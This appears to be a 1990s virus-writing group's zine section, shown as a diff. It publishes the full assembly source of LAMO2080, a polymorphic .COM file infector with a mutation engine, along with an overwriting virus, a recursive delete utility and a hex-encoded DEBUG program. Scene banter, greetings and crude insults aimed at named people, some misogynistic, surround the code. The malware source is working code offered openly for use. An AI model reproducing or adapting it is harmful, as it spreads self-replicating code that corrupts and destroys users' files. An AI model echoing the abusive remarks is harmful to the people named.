+E 0160 04 BE B9 02 3B 2C 72 02 33 ED 87 FB B4 40 CD 21
+E 0170 3D 01 00 75 04 87 FB EB D2 B4 3E CD 21 87 FB CD
+E 0180 21 B4 09 BA 39 02 CD 21 CD 20 00 57 68 69 63 68
+E 0190 20 6B 65 79 20 73 68 61 6C 6C 20 49 20 75 73 65
+E 01A0 3F 20 24 0D 0A 45 6E 74 65 72 20 66 69 6C 65 6E
+E 01B0 61 6D 65 20 74 6F 20 65 6E 63 72 79 70 74 3A 20
+E 01C0 24 45 6E 74 65 72 20 64 65 73 74 69 6E 61 74 69
+E 01D0 6F 6E 20 66 69 6C 65 20 28 2E 63 6F 6D 29 3A 20
+E 01E0 24 0A 0D 24 73 65 63 72 65 74 2E 74 78 74 00 00
+E 01F0 00 00 73 65 63 72 65 74 2E 63 6F 6D 00 00 00 00
+E 0200 45 6E 63 72 79 70 74 69 6E 67 20 24 44 65 63 72
+E 0210 79 70 74 69 6E 67 20 24 64 61 74 61 2C 20 74 68 
+E 0220 69 73 20 6D 69 67 68 74 20 74 61 6B 65 20 61 20
+E 0230 77 68 69 6C 65 2E 2E 2E 24 0D 0A 64 6F 6E 65 21
+E 0240 0D 0A 24 54 68 65 72 65 20 69 73 20 6E 6F 20 73
+E 0250 75 63 68 20 66 69 6C 65 21 20 63 68 6F 6F 73 65
+E 0260 20 61 6E 6F 74 68 65 72 20 66 69 6C 65 20 5B 59
+E 0270 2F 6E 5D 24 4F 75 74 70 75 74 20 66 69 6C 65 20
+E 0280 61 6C 72 65 61 64 79 20 65 78 69 73 74 21 20 4F
+E 0290 76 65 72 77 72 69 74 65 20 5B 59 2F 6E 5D 3F 24
+E 02A0 0D 0A 4C 65 61 76 69 6E 67 20 74 68 69 73 20 77
+E 02B0 6F 72 6C 64 2E 2E 0D 0A 24 27 1A 45 52 39 22 34
+E 02C0 72 4D 31 51 0E 1F 10 0D 52 34 25 28 21 0E 33 42
+E 02D0 02 13 07 08 1F 7F 40 4B 5F 24 0A 17 00 54 1C 04
+E 02E0 02 32 28 32 21 4B 27 11 60 7E 78 63 30 35 39 61
+E 02F0 1B 09 2E 10 03 1B 01 49 1B 2D 3D 33 37 5D 30 55
+E 0300 09 54 17 10 52 39 22 34 7E 0E 36 5E 01 11 06 1A
+E 0310 52 39 22 34 75 5C 26 10 19 1C 10 49 1D 2E 28 61
+E 0320 25 46 2C 10 1A 06 1A 1D 17 4D 47 35 3A 4B 63 54
+E 0330 08 17 1C 19 1A 25 3F 6C 21 41 25 44 1A 15 07 0C
+E 0340 5C 4D 47 4C 58 67 25 10 14 1B 00 49 1A 2F 3A 24
+E 0350 24 4B 31 10 09 1D 11 49 05 32 24 35 37 0E 37 58
+E 0360 08 54 11 0C 11 32 34 31 26 47 2C 5E 40 06 1A 1C
+E 0370 06 29 23 24 7E 0E 33 5C 08 15 06 0C 52 23 22 2F
+E 0380 26 4F 20 44 60 7E 18 0C 52 36 24 20 72 4B 2E 51
+E 0390 04 18 55 06 1C 7A 40 4B 5F 24 2E 59 03 10 17 07
+E 03A0 16 32 0D 32 3D 5E 2B 5F 0E 18 10 1A 5C 21 21 26
+E 03B0 3D 40 26 44 43 07 10 45 7F 4A 40 4B 33 4A 31 55
+E 03C0 1E 07 55 1D 1A 25 6D 2C 37 5D 30 51 0A 11 55 1E
+E 03D0 1B 34 25 61 26 46 26 10 19 1B 05 00 11 7A 40 4B
+E 03E0 5F 24 61 64 02 54 21 01 17 60 18 2F 34 41 31 57
+E 03F0 04 02 10 07 50 4D 47 4C 58 5D 2A 5E 0E 11 55 20
+E 0400 55 2D 6D 2F 3D 5A 63 7D 04 1A 11 0B 17 2E 29 24
+E 0410 20 00 6D 10 60 7E 78 63 3D 28 63 6F 5F 24 4E 3A
+E 0420 0C 16 1A 1C 06 60 20 38 72 5C 26 51 01 59 1B 08
+E 0430 1F 25 6D 32 26 5B 25 56 52 79 7F 64 78 04 2C 2C
+E 0440 3C 47 37 11 4D 20 1D 00 01 60 24 32 72 4F 2D 10
+E 0450 0C 04 07 00 1E 6D 2B 24 25 42 62 3D 67 79 7F 21
+E 0460 33 6D 05 00 73 23 49 3D 67 59 55 3D 27 4D 47 5B
+RCX
+0370
+W
+Q
+================================================================================
+comment #
+
+SUBDEL
+
+Deltree, of sorts.
+
+I'm sure you can sell it for a few bux0rs if you
+say DOS-utils suck and it's better to develop your
+own personal stuff to giving the company a better
+image. 
+
+Errr ;).
+#
+
+.model tiny
+.code
+org 100h
+
+main:                              
+    cld
+    mov ah,19h                      
+    int 21h
+    mov SaveDrive,al
+    mov RemoveDrive,al
+    mov ah,47h
+    xor dl,dl
+    mov si,offset SaveDir+1
+    int 21h
+
+    call get_param                  
+
+    mov ah,0eh                      
+    mov dl,RemoveDrive
+    int 21h
+    mov ah,19h                      
+    int 21h
+    cmp al,RemoveDrive
+    jne main3                       
+    add al,'A'
+    mov byte ptr [Remove_msg+10],al 
+
+    mov ah,3bh                     
+    mov dx,offset RemoveDir
+    int 21h
+    jc main3                      
+
+    mov ah,9h                     
+    mov dx,offset Warning_msg
+    int 21h
+    mov dx,offset RemoveDir
+    int 21h
+    mov dx,offset Warning_msg2
+    int 21h
+    mov ah,08h                     
+    int 21h
+    and al,223
+    cmp al,'Y'                      
+    je main5
+    cmp al,'F'                     
+    jne main4                       
+    inc FileMask                    
+    
+main5:
+    mov dx,offset Line              
+    mov ah,9
+    int 21h
+    call traverse                  
+    mov dx,offset Line             
+    mov ah,9
+    int 21h
+
+    mov ax,Files                    
+    mov di,offset Files
+    call i2a
+    mov ax,Dirs                     
+    mov di,offset Dirs
+    call i2a
+    mov dx,offset Files            
+    mov ah,9
+    int 21h
+    mov dx,offset File_msg
+    int 21h
+    mov dx,offset Dirs
+    int 21h
+    mov dx,offset Dir_msg
+    int 21h
+
+    jmp short main4                
+
+main3:                             
+    mov ah,9
+    mov dx,offset Line
+    int 21h
+    mov dx,offset error_msg
+    int 21h
+    mov dx,offset Line
+    int 21h
+
+main4:                            
+    mov ah,0eh
+    mov dl,SaveDrive
+    int 21h
+    mov ah,3bh                    
+    mov dx,offset SaveDir
+    int 21h   
+
+    int 20h                       
+
+traverse:
+    push bp                        
+    mov bp,sp
+    sub sp,44
+
+    call process_dir               
+
+    mov ah,1ah                      
+    lea dx,word ptr [bp-44]
+    int 21h
+
+    mov ah,4eh                    
+    mov cx,16
+    mov dx,offset wild
+again:
+    int 21h
+    jc nmd                        
+
+    cmp byte ptr [bp-14],'.'      
+    je fnd
+    lea dx,word ptr [bp-14]       
+    mov ah,3bh
+    int 21h
+    jc fnd
+    inc nest                        
+    call traverse                  
+
+fnd:
+    lea dx,word ptr [bp-44]        
+    mov ah,1ah
+    int 21h
+    mov ah,4fh                      
+    jmp short again
+nmd:
+    cmp nest,0                     
+    jle clean                     
+    dec nest                       
+
+    mov ah,47h                    
+    xor dl,dl
+    mov si,offset RemoveDir+1
+    int 21h
+
+    mov dx,offset up_one_dir        
+    mov ah,3bh
+    int 21h
+
+    cmp byte ptr filemask,1       
+    je clean                       
+
+    mov byte ptr RemoveDir,'\'      
+    mov ah,3ah
+    mov dx,offset RemoveDir
+    int 21h
+    inc Dirs                       
+clean:
+    mov sp,bp                       
+    pop bp
+    ret                           
+
+
+process_dir:
+    mov si,offset Remove_msg       
+    call write
+    mov ah,47h
+    xor dl,dl
+    mov si,offset RemoveDir
+    int 21h
+    call write
+    mov si,offset nl
+    call write
+
+    mov ah,1ah                     
+    mov dx,offset DTA_area
+    int 21h
+
+ff:
+    mov ah,4eh                    
+    mov cx,7h
+    mov dx,offset wild
+fmf:                              
+    int 21h
+    jc nmf
+
+    mov dx,offset DTA_area+30     
+    mov cx,32
+    mov ax,4301h
+    int 21h
+    mov ah,41h                      
+    int 21h
+
+    inc Files                       
+
+    mov ah,4fh                    
+    jmp short fmf
+nmf:                              
+    ret
+
+
+write:                            
+    xor bh,bh                      
+write2:
+    lodsb
+    or al,al
+    jz write3
+    int 29h
+    jmp short write2
+write3:
+    ret
+
+i2a:                              
+    mov bx,10                      
+    push '$'                       
+i4a:
+    xor dx,dx
+    div bx
+    add dl,'0'
+    push dx
+    or ax,ax
+    je i3a
+    jmp short i4a
+i3a:
+    pop ax
+    stosb
+    cmp ax,'$'
+    je i5a
+    jmp short i3a
+i5a:
+    ret
+
+get_param:
+    mov si,80h
+    mov cl,[si]                    
+    xor ch,ch
+    jcxz get4                      
+    inc si
+    mov di,offset RemoveDir        
+get1:
+    lodsb
+    cmp al,' '                     
+    je get3
+    cmp al,':'                    
+    jne get2
+
+    dec si                         
+    dec si
+    lodsb
+    inc si
+    and al,223
+    sub al,'A'
+    mov RemoveDrive,al
+    mov di,offset RemoveDir
+    jmp get3
+
+get2:
+    stosb                          
+get3:
+    loop get1                     
+    xor al,al
+    stosb                          
+    mov al,'$'
+    stosb
+    cmp word ptr [RemoveDir],005ch
+    jne get6                       
+    mov dx,offset NoRoot
+    jmp short get5
+get6:
+    ret                            
+
+get4:
+    mov dx,offset CommandLine
+get5:
+    mov ah,9                       
+    int 21h
+    int 20h                         
+
+Files dw 0
+    db 3 dup('$')
+Dirs dw 0
+    db 3 dup('$')
+wild db '*.*',0
+nest db 1
+up_one_dir db '..',0
+RemoveDrive db 255
+FileMask db 0
+nl db 10,13,0
+Warning_msg db 10,13,'Are you sure you want to remove $'
+Warning_msg2 db 'with subdirectories?',10,13,'Yes, No, or just Files [Y/N/F]'
+    db 10,13,'$'
+Remove_msg db ' Removing  :\',0
+File_msg db ' files and $'
+Dir_msg db ' directories were removed!',10,13,'$'
+Line db 'ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä'
+    db 10,13,'$'
+CommandLine db 'Usage: Remove <path>',10,13,'Remove deletes all files'
+    db ' and subdirectories to specified path.',10,13,'$'
+NoRoot db "You can't delete the entire disk! If that's what you want, do use"
+    db 10,13,'format instead',10,13,'$'
+Error_msg db 'Invalid directory!',10,13,'$'
+SaveDir db '\'
+    db 64 dup(?)
+SaveDrive db ?
+RemoveDir db 64 dup(?)
+DTA_area db 43 dup(?)
+
+end main
+================================================================================
+
+% Why on earth are you still reading? %
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+Well, as a thank-you-very-much-for-still-reading this-shit, I give you 
+(drum-roll) LAMO2080 developed by Liquid Jesus to test a polymophic idea he 
+thought-up on New Years.
+
+Maybe I should've kept this for a while or so :-), so he could've done
+another virus for the engine, but I didn't, so here it is..
+Please forgive me, Liquid, I'm sure you'll write a virus to spread
+the next time..
+
+
+
+
+								   lamo 2080 þ
+
+								liquid jesus þ
+
+							       immortal riot þ
+
+								     1995/96 þ
+
+
+
+
+
+
+
+      boring runtime appending .com infector featuring:
+
+      full polymorphing.
+
+|
+.8086                                  ; feel the power :)
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+virlength       equ     (vend-cryptstart)
+cryptlength     equ     (cryptend-cryptstart)
+memsize         equ     (mend-dummy)
+
+secstamp        equ     3
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+jumps
+smart
+locals
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+code            segment
+assume          cs:code, ds: code
+
+org             100h
+
+dummy:
+	db      0e9h
+	dw      0
+cryptstart:
+	call    duh
+duh:
+	pop     bp
+	sub     bp,offset duh
+
+	mov     di,100h
+	push    di
+	lea     si,[tre+bp]
+	movsw
+	movsb
+
+	lea     dx,[dta+bp]
+	call    setdta
+
+	mov     ah,4eh
+infect:
+	xor     al,al
+	xor     cx,cx
+	lea     dx,[commask+bp]
+	int     21h
+	jc      quit
+
+	mov     cx,word ptr [dta+bp+22]
+
+	mov     ax,cx
+	and     ax,31
+	cmp     ax,secstamp
+	je      realnext
+
+	push    cx                     ; time
+	push    word ptr [dta+bp+24]   ; data
+
+	mov     ax,3d02h
+	lea     dx,[dta+bp+30]
+	int     21h
+	jc      next
+	xchg    bx,ax
+
+	mov     ah,3fh
+	lea     dx,[tre+bp]
+	mov     cx,3
+	int     21h
+
+	mov     ax,word ptr [dta+bp+26]
+
+	mov     cx,[randomword+bp]
+	and     cx,31
+	mov     word ptr [wbuf+bp+1],cx
+	push    cx
+
+	cmp     ax,65535-(100h+memsize)
+	ja      quit
+	sub     ax,3
+	add     word ptr [wbuf+bp+1],ax
+	add     ax,offset cryptstart
+	add     ax,cx
+	mov     word ptr [decryptor+1+bp],ax
+
+	xor     al,al
+	call    fptr
+
+	mov     ah,40h
+	lea     dx,[bp+wbuf]
+	mov     cx,3
+	int     21h
+
+	dec     ax
+	call    fptr
+
+	lea     si,[cryptstart+bp]
+	lea     di,[tempvir+bp]
+	push    di
+	mov     cx,virlength/2
+	rep     movsw
+	pop     di
+	mov     si,di
+
+	push    bx
+
+	xor     ax,ax
+	int     1ah
+	add     word ptr [randomword+bp],dx
+
+	call    mutation               ; generates the new encrypt/decrypt ..
+
+	lea     si,[bp+cryptstart]
+	lea     di,[bp+tempvir]
+	mov     cx,(cryptend-cryptstart)
+cryptloop:
+	lodsb
+	call    encryptorprc
+	stosb
+	loop    cryptloop
+
+	pop     bx
+
+	pop     cx                     ; fix random length padding ..
+	mov     ah,40h
+	lea     dx,[bp+encryptor]
+	int     21h
+
+	mov     ah,40h                 ; write decryptor ..
+	mov     cx,[bp+decryptorsize]
+	lea     dx,[bp+decryptor]
+	int     21h
+
+	mov     ah,40h                 ; write the rest of the virus ..
+	mov     cx,(cryptend-cryptstart)
+	lea     dx,[bp+tempvir]
+	int     21h
+next:
+	mov     ax,5701h
+	pop     dx
+	pop     cx
+	and     cl,11100000b
+	or      cl,secstamp
+	int     21h
+
+	mov     ah,3eh
+	int     21h
+
+realnext:
+	mov     ah,4fh
+	jmp     infect
+quit:
+	mov     dx,80h
+setdta:
+	mov     ah,1ah
+	int     21h
+	ret
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+fptr:
+	mov     ah,42h
+	xor     cx,cx
+	cwd
+	int     21h
+	ret
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+mutation:                              ; the smeGGma mutation engine.
+	lea     di,[encryptor+bp]
+	mov     cx,8
+	mov     ax,9090h
+	rep     stosw
+
+	mov     byte ptr [encryptor+bp+15],0c3h
+
+	mov     di,[randomword+bp]
+	mov     bx,di
+	and     di,3                   ; di is the init/end ptr ..
+	rol     bx,1
+	and     bx,3                   ; bx is the loop ptr .
+	add     bx,bp
+	xor     si,si                  ; si is the location ptr ..
+
+	mov     al,[lealist+di+bp]
+	mov     [decryptor+si+bp],al
+	add     si,3
+
+	call    randomjunk
+
+	mov     al,[sizelist+bx]
+	mov     [decryptor+si+bp],al
+	mov     word ptr [decryptor+bp+si+1],cryptlength
+	add     si,3
+
+	call    randomjunk
+
+	add     di,di
+	mov     ax,[lodslist+di+bp]
+	mov     word ptr [decryptor+si+bp],ax
+	add     si,2
+
+	call    randomjunk
+
+	push    di
+	mov     di,[randomword+bp]
+	ror     di,7
+	mov     cx,di
+	and     di,7
+	add     di,di
+	cmp     di,8
+	jge     norandom               ; these routines don't need a random 
+				       ; numba ..
+
+	mov     ax,[encryptlist+bp+di]
+	mov     word ptr [decryptor+bp+si],ax
+	mov     ax,[decryptlist+bp+di]
+	mov     word ptr [encryptor+bp],ax
+	mov     byte ptr [decryptor+bp+si+1],cl
+	mov     byte ptr [encryptor+bp+1],cl
+	jmp     yesrandom
+norandom:
+	mov     ax,[encryptlist+bp+di]
+	mov     word ptr [decryptor+bp+si],ax
+	mov     ax,[decryptlist+bp+di]
+	mov     word ptr [encryptor+bp],ax
+yesrandom:
+	add     si,2
+
+	pop     di
+
+	call    randomjunk
+
+	mov     ax,[stoslist+di+bp]
+	mov     word ptr [decryptor+si+bp],ax
+	add     si,2
+
+	call    randomjunk
+
+	shr     di,1
+	mov     al,[incptrlist+di+bp]
+	mov     [decryptor+si+bp],al
+	inc     si
+
+	call    randomjunk
+
+	mov     al,[declist+bx]
+	mov     [decryptor+si+bp],al
+	mov     byte ptr [decryptor+si+bp+1],075h
+	mov     ax,-1+6
+	sub     ax,si
+	mov     byte ptr [decryptor+si+bp+2],al
+	add     si,3
+	mov     [decryptorsize+bp],si
+	add     word ptr [decryptor+bp+1],si    ; add starting offset ..
+	ret
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+randomjunk:
+	push    di
+	mov     di,[randomword+bp]
+	rol     di,1
+	add     [randomword+bp],di
+	and     di,31
+	cmp     di,24
+	jge     @@dope
+	add     di,di
+	mov     ax,[boguslist+bp+di]
+	mov     word ptr [decryptor+bp+si],ax
+	add     si,2
+@@dope:
+	pop     di
+	ret
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+		db      "lamo2080 - liquid jesus - immoratal riot 1995/96"
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+commask         db      "*.com",0
+
+tre             db      0cdh
+		db      20h
+		db      90h
+
+randomword      dw      7423h
+
+wbuf            db      0e9h
+		dw      0
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+sizelist        label   byte
+		db      0b9h           ; mov cx,xx
+		db      0bah           ;     dx
+		db      0bdh           ;     bp
+		db      0bah           ;     dx
+
+declist         label   byte
+		db      049h           ; dec cx
+		db      04ah           ;     dx
+		db      04dh           ;     bp
+		db      04ah           ;     dx
+
+lodslist        label   word
+		dw      0048ah         ; mov ax,[si]
+		dw      0058ah         ;         di
+		dw      0078ah         ;         bx
+		dw      0058ah         ;         di
+
+stoslist        label   word
+		dw      00488h         ; mov [si],ax
+		dw      00588h         ;      di
+		dw      00788h         ;      bx
+		dw      00588h         ;      di
+
+lealist         label   byte
+		db      0beh           ; mov si,xx
+		db      0bfh           ;     di
+		db      0bbh           ;     bx
+		db      0bfh           ;     di
+
+incptrlist      label   byte
+		db      046h           ; si
+		db      047h           ; di
+		db      043h           ; bx
+		db      047h           ; di
+
+boguslist       label   word
+		dw      0c009h         ; or ax,ax
+		dw      0db09h         ;    bx
+		dw      0c909h         ;    cx
+		dw      0d209h         ;    dx
+		dw      0f609h         ;    si
+		dw      0ff09h         ;    di
+		dw      0ed09h         ;    bp
+
+		dw      0c021h         ; and ax,ax
+		dw      0db21h         ;     bx
+		dw      0c921h         ;     cx
+		dw      0d221h         ;     dx
+		dw      0f621h         ;     si
+		dw      0ff21h         ;     di
+		dw      0ed21h         ;     bp
+
+		dw      0db87h         ; xchg bx,bx
+		dw      0c987h         ; xchg cx,cx
+
+		dw      05850h         ; push and pop registers ..
+		dw      05951h         ;
+		dw      05a52h         ;
+		dw      05b53h         ;
+		dw      05c54h         ;
+		dw      05d55h         ;
+		dw      05e56h         ;
+		dw      05f57h         ;
+
+encryptlist     label   word
+		dw      00004h         ; add al,xx
+		dw      0002ch         ; sub al,xx
+		dw      00034h         ; xor al,xx
+		dw      00004h         ; add al,xx
+		dw      0c0feh         ; inc al
+		dw      0c8feh         ; dec al
+		dw      0c0d0h         ; rol al,1
+		dw      0c8d0h         ; ror al,1
+
+decryptlist     label   word
+		dw      0002ch         ; sub al,xx
+		dw      00004h         ; add al,xx
+		dw      00034h         ; xor al,xx
+		dw      0002ch         ; sub al,xx
+		dw      0c8feh         ; dec al
+		dw      0c0feh         ; inc al
+		dw      0c8d0h         ; ror al,1
+		dw      0c0d0h         ; rol al,1
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+cryptend        label   byte
+vend            label   byte
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+dta             db      128 dup (?)
+tempvir         db      (vend-cryptstart) dup (?)
+decryptor       db      32 dup (?)     ; this the workspace for the decryptor
+encryptorprc:
+encryptor       db      16 dup (?)     ; this the workspace for the encryptor
+decryptorsize   dw      ?
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+mend            label   byte
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+code            ends
+
+end             dummy
+================================================================================
+
+% Ask for permission %
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+So, you want more meaningless and dumb code?
+Well, you got it ;). 
+
+It seems like viruses these days are produced for the vx-underground
+rather than for 'innocent' computer-users. The attitude has changed
+and either you're for or against it I present to you a perfect example
+of this changes in attitude.
+
+This virus will not replicate by itself but will itsert into a user-
+definied file by overwriting it with itself. It's a lame idea and I
+didn't feel like spend more than ten minutes implementing it.
+
+comment #
+
+This virus is like a party...
+
+First of all you place yourself among as many babes as possible. Then,
+you chose one with who you want to ejaculate in. Simple as that.
+
+The virus name is a Italian cheap wine which I gotta 'buy-out' for
+many 17 years old girls, Emelie - on italian Emilia, hence the
+name of this virus.
+
+- -T-to-the-U-
+
+#
+
+.model tiny
+.code
+org 100h
+
+start:
+
+    mov ah,9
+    mov dx, offset enterdata
+    int 21h
+
+    mov si,offset inputfile
+    call poll_name
+
+    mov ax,3d02h
+    mov dx, offset inputfile
+    int 21h
+    jnc openok
+
+    inc exist
+    jmp short newline
+
+openok:
+
+    xchg ax,bx
+
+    mov ah,40h
+    mov cx,codeend-start
+    mov dx, offset start
+    int 21h
+    
+newline:
+
+    mov si, offset nl
+
+loadbyte:
+    lodsb
+    or al,al
+    je endofs
+    int 29h
+    jmp short loadbyte
+
+endofs:
+    mov ah,9
+    mov dx, offset isinf
+    cmp byte ptr exist,0
+    je indeed
+    mov dx, offset noinf
+
+indeed:
+    int 21h
+    int 20h
+
+poll_name:
+    mov ah,1
+    int 21h
+    cmp al,13
+    je end_poll
+    mov byte ptr [si],al
+    inc si
+    jmp short poll_name
+end_poll:
+    mov byte ptr [si],0
+    ret
+
+enterdata db "Enter girl to seduce: ",36
+nl        db 13,10
+inputfile db 14 dup(0)
+marker    db 0
+isinf     db " is now infected!",36
+noinf     db " is not found - not infected!",36
+exist     db 0
+viralname db "Donelli LAMBRUSCHO DELL MILIA BIANCO"
+
+codeend:
+end start
+================================================================================
+
+% Interview's %
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+I haven't been all that active over the IRC and havn't got that many people
+to do interview's with, sorry.
+
+What follow is however one really high quality interview done the 31/3-96,
+with my own dog.
+
+[MyDog] is a nine year old male who has been in and out in the vx-scene 
+the last 3 years. Among many viruses he's written, I can't really name
+a single one.
+
+- The Unforgiven.
+
+TU = Me
+DG = Dog
+
+TU> Hi, this is me, introduce yourself to the readers!
+
+DG> Barf!! Barf!!
+
+TU> How long have you been active in the virus-underground?
+
+DG> Barf!! Barf! Barf! Barf!!!
+
+TU> I see and what's your police about destructive viruses?
+
+DG> ....... <doesn't seem to understand the question>
+
+TU> Do you encourage desctruction performed with viruses or not?
+
+DG> Barf!!!
+
+TU> Ok. Thank you very much!!
+================================================================================
+
+% How to contact IR? %
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+Well, don't bother calling our HQ TWL anymore since it's down.
+You could however try, 
+
+Blnir@anon.penet.fi
+
+     - or - 
+
+email Qark on Qark@tjava.com and say he should give me my email
+and stuff (Sorry Qark, but I trust you and your judgement!).
+
+Why bother contacting us anyways?
+
+% Things that wants to be said, but hasn't [yet] %
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+First of all, I would like to say a few personal things to different people
+around the world.
+
+Emma, 
+
+Go fuck yourself. I mean it. You're one coward-bitch.
+
+Richard Loerakker,
+
+Where ya been? Err.. I won't come to NL since I don't have enough money
+for it.. I'm saving every cent I'm earning and stuff.. You are though
+as always welcome here!
+
+Tornado,
+
+Sorry for not making it to your place.. I ended up in Fredrikshamn
+(Fredrikshaven???), I have nothing against you and Darkman and would
+love meeting you sometime.. You too, are welcome here if you like.
+
+Emelie,
+
+>S†n„ra f†r ingen g†!
+>S†n„ra s† du blir v†t)
+
+(So close so you get wet,
+but.. so close may no cum )
+
+Zerial,
+
+Nice to see you're *alive* if you know what I mean..
+But.. Don't underestimate the cruelness of the other sex.
+
+Qark,
+
+I will enjoy reading this zine :). Surely, people will hate this
+contribution! Which more or less, is exactly how I want it to be.
+
+Metabolis,
+
+"Things will get better." I hope they are. Hang in there..
+
+Dark Fiber,
+
+Thanks for all things I've recieved from you. I sincerly hope things
+are fine with you and stuff..
+
+Sepultura,
+
+Of course you are a member and you can count yourself as a member of our
+group. We all love your code!
+
+Liquid Jesus,
+
+OK! Det kanske var dumt att sl„ppa din kod, men s† „r det i alla fall ;),
+den var hel-juste. Žndra grund-koden (infektions-f”rm†gan), och s† pl†gar
+vi lite folk.. 
+
+Charles Manson,
+
+Whimp!
+
+Methyl,
+
+Thanks for giving us the only feedback concering our previous issue :).
+
+Redback,
+
+Thanks for spelling fixing this little work of shit :),
+Good luck with that 30-meter away girl and for correcting
+it's content :). 
+
+Immortal Riot members,
+
+I know I'm in the position of an organizer when someone else should be. 
+Don't hesitate to contact me concerning this. Things could be better with 
+the capacity you have. 
+
+% Greetings %
+ÄÄÄÄÄÄÄÄÄÄÄÄÄ
+To virus-writer's here, there and everywhere.
+To all people around the world, I like.
+and so on..
+
+Hi there!!
+
+% Credits %
+ÄÄÄÄÄÄÄÄÄÄÄ
+The Unforgiven
+Redback
+Liquid Jesus
+
+Also thanks to Qark for informing me about this idea :).
+
+% The meaning with live, the scene and marlboro %
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+I will make this chapter really short. :).
+
+There is no, never will be and never has been a meaning with 
+anything. 
+
+Think about that when you feel too damn happy!
+
+% VX meets VX %
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+When you meet scene-persons, that is kind of funny since you always makes
+up an image of how you thought they should be.
+
+> Blonde, TUIR, Raver, Redback and Movitz in TU's house <
+
+	     (* plus about 20 other people *)
+
+Blonde was too busy getting himself understood with his accent :).
+Movitz was too drunk to fuck Monica and crashed after a few hours.
